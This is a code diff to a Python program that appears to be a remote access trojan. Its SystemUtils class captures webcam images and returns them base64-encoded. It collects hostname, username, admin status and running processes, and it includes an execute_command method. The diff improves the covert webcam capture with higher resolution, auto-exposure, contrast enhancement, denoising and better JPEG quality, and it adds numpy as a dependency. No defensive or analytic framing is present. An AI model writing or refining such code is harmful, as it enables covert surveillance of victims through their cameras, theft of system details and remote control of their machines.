@@ -27,7 +27,8 @@ required_modules = [
     ('websocket', 'websocket-client'),
     ('mss', None),
     ('Pillow', None),
-    ('opencv-python', None)
+    ('opencv-python', None),
+    ('numpy', None)
 ]
 
 # Check and install missing modules
@@ -111,7 +112,10 @@ try:
     import tempfile
     import multiprocessing
     from PIL import Image
+    import numpy as np
   
+    
+    import cv2
     
     print("All modules imported successfully!")
 
@@ -1264,169 +1268,108 @@ class SystemUtils:
             return None
 
     @staticmethod
+
     def capture_webcam():
-        """Capture an image from the default webcam using OpenCV"""
+        """Capture an optimized image from the default webcam using OpenCV"""
         logger = logging.getLogger('SystemUtils')
         try:
-            logger.info("Attempting to capture webcam image")
+            logger.info("Attempting to capture optimized webcam image")
             
-            # Try to import opencv
-            try:
-                import cv2
-                logger.debug("OpenCV imported successfully")
-            except ImportError:
-                logger.error("OpenCV not available - webcam capture failed")
-                return None
-            
-            # Try to access the default webcam with explicit backend
-            # Try multiple camera indices and backends for better compatibility
-            # Use platform-appropriate backends for cross-platform compatibility
+            # Kamera-oppsett
             camera_indices = [0, 1, 2]
-            
-            # Detect platform and use appropriate video capture backends
             current_platform = platform.system()
+            
             if current_platform == 'Windows':
-                backends = [
-                    (cv2.CAP_DSHOW, "DShow"),
-                    (cv2.CAP_MSMF, "MSMF"),
-                    (cv2.CAP_ANY, "ANY")
-                ]
+                backends = [(cv2.CAP_DSHOW, "DShow"), (cv2.CAP_MSMF, "MSMF"), (cv2.CAP_ANY, "ANY")]
             elif current_platform == 'Linux':
-                # Try V4L2 first for Linux, then fall back to ANY
-                backends = [
-                    (cv2.CAP_V4L2, "V4L2"),
-                    (cv2.CAP_ANY, "ANY")
-                ]
+                backends = [(cv2.CAP_V4L2, "V4L2"), (cv2.CAP_ANY, "ANY")]
             else:
-                # macOS and other platforms
-                backends = [
-                    (cv2.CAP_ANY, "ANY")
-                ]
+                backends = [(cv2.CAP_ANY, "ANY")]
             
             cap = None
-            used_backend = None
-            used_index = None
-            
             for camera_index in camera_indices:
                 for backend, backend_name in backends:
-                    try:
-                        logger.debug(f"Trying camera {{camera_index}} with backend {{backend_name}}")
-                        cap = cv2.VideoCapture(camera_index, backend)
-                        
-                        if cap.isOpened():
-                            used_backend = backend_name
-                            used_index = camera_index
-                            logger.info(f"Successfully opened camera {{camera_index}} with {{backend_name}} backend")
-                            break
-                        else:
-                            cap.release()
-                            cap = None
-                    except Exception as e:
-                        logger.debug(f"Camera {{camera_index}} with {{backend_name}} failed: {{str(e)}}")
-                        continue
-                
+                    cap = cv2.VideoCapture(camera_index, backend)
+                    if cap.isOpened():
+                        break
+                    cap.release()
                 if cap and cap.isOpened():
                     break
             
-            # Check if webcam opened successfully
             if not cap or not cap.isOpened():
-                logger.error("Failed to open webcam - device not available on any index/backend")
+                logger.error("Failed to open webcam")
                 return None
+
+           
+            cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
+            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
             
-            # Set camera properties to fix exposure/auto-gain issues that cause black images
-            # These settings help force the camera to capture a proper image
-            logger.debug("Setting camera properties for better capture")
-            cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
-            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
-            cap.set(cv2.CAP_PROP_BRIGHTNESS, 128)  # Mid-range brightness
-            cap.set(cv2.CAP_PROP_CONTRAST, 128)     # Mid-range contrast
-            cap.set(cv2.CAP_PROP_SATURATION, 128)   # Mid-range saturation
-            cap.set(cv2.CAP_PROP_GAIN, 64)          # Some gain to help with low light
-            cap.set(cv2.CAP_PROP_EXPOSURE, -5)      # Try to set exposure (may not work on all cameras)
+           
+            cap.set(cv2.CAP_PROP_AUTO_EXPOSURE, 3) # Auto-mode
             
-            # Allow camera to warm up - many cameras need a few frames to adjust exposure/white balance
-            logger.debug("Warming up camera (allowing it to adjust exposure/white balance)")
-            warmup_frames = 10
-            for i in range(warmup_frames):
-                ret, frame = cap.read()
-                if not ret:
-                    logger.warning("Warmup frame " + str(i+1) + "/" + str(warmup_frames) + " failed")
-                else:
-                    logger.debug("Warmup frame " + str(i+1) + "/" + str(warmup_frames) + " captured successfully")
-                time.sleep(0.2)  # Small delay between warmup frames
+         
+            logger.debug("Warming up for auto-calibration...")
+            for i in range(20): 
+                cap.read()
+                time.sleep(0.1)
             
-            # Read the actual frame to capture
-            logger.debug("Reading frame from webcam")
             ret, frame = cap.read()
-            
-            # Release the webcam immediately after capture
             cap.release()
             
             if not ret:
-                logger.error("Failed to capture frame from webcam")
                 return None
+
+           
+            lab = cv2.cvtColor(frame, cv2.COLOR_BGR2LAB)
+            l, a, b = cv2.split(lab)
+            clahe = cv2.createCLAHE(clipLimit=1.5, tileGridSize=(8, 8))
+            l = clahe.apply(l)
+            lab = cv2.merge([l, a, b])
+            frame = cv2.cvtColor(lab, cv2.COLOR_LAB2BGR)
             
-            logger.debug(f"Captured frame with shape: {{frame.shape}}")
+         
+            frame = cv2.fastNlMeansDenoisingColored(frame, None, 7, 7, 7, 21)
             
-            # Note: Brightness validation disabled for debugging
-            # gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
-            # avg_brightness = cv2.mean(gray)[0]
-            # logger.debug("Frame average brightness: " + str(avg_brightness))
-            # if avg_brightness < 1:
-            #     logger.error("Captured frame is too dark (avg brightness: " + str(avg_brightness) + ") - possible camera issue")
-            #     return None
-            
-            # Encode the frame as JPEG
-            logger.debug("Encoding frame to JPEG")
-            _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 85])
-            
-            # Validate encoded buffer
-            if buffer is None or len(buffer) == 0:
-                logger.error("Failed to encode frame to JPEG - buffer is empty")
-                return None
-            
-            # Convert to base64
-            logger.debug("Encoding to base64")
-            webcam_data = base64.b64encode(buffer).decode('utf-8')
-            
-            # Validate base64 data
-            if not webcam_data or len(webcam_data) < 100:
-                logger.error("Base64 encoding seems invalid (length: " + str(len(webcam_data) if webcam_data else 0) + ")")
-                return None
-            
-            logger.info("Webcam capture successful - image size: " + str(len(webcam_data)) + " bytes")
-            return webcam_data
+          
+            gamma = 1.1 
+            invGamma = 1.0 / gamma
+            table = np.array([((i / 255.0) ** invGamma) * 255 for i in np.arange(0, 256)]).astype("uint8")
+            frame = cv2.LUT(frame, table)
+
+        
+            _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 95])
+            return base64.b64encode(buffer).decode('utf-8')
             
         except Exception as e:
             logger.error(f"Webcam capture error: {{str(e)}}")
             return None
-    
+
     @staticmethod
     def get_system_info():
-        try:
-            info = {{
-                "hostname": platform.node(),
-                "username": os.getlogin(),
-                "os": platform.platform(),
-                "architecture": platform.architecture()[0],
-                "processor": platform.processor(),
-                "ram": round(psutil.virtual_memory().total / (1024**3), 2),
-                "privilege": "admin" if ctypes.windll.shell32.IsUserAnAdmin() else "user",
-                "processes": []
-            }}
+            try:
+                info = {{
+                    "hostname": platform.node(),
+                    "username": os.getlogin(),
+                    "os": platform.platform(),
+                    "architecture": platform.architecture()[0],
+                    "processor": platform.processor(),
+                    "ram": round(psutil.virtual_memory().total / (1024**3), 2),
+                    "privilege": "admin" if ctypes.windll.shell32.IsUserAnAdmin() else "user",
+                    "processes": []
+                }}
 
-            for proc in sorted(psutil.process_iter(['pid', 'name', 'username', 'cpu_percent']), 
-                             key=lambda p: p.info['cpu_percent'], reverse=True)[:10]:
-                info["processes"].append({{
-                    "pid": proc.info['pid'],
-                    "name": proc.info['name'],
-                    "user": proc.info['username'],
-                    "cpu": proc.info['cpu_percent']
-                }})
+                for proc in sorted(psutil.process_iter(['pid', 'name', 'username', 'cpu_percent']), 
+                                key=lambda p: p.info['cpu_percent'], reverse=True)[:10]:
+                    info["processes"].append({{
+                        "pid": proc.info['pid'],
+                        "name": proc.info['name'],
+                        "user": proc.info['username'],
+                        "cpu": proc.info['cpu_percent']
+                    }})
 
-            return info
-        except:
-            return {{}}
+                return info
+            except:
+                return {{}}
 
     @staticmethod
     def execute_command(cmd):
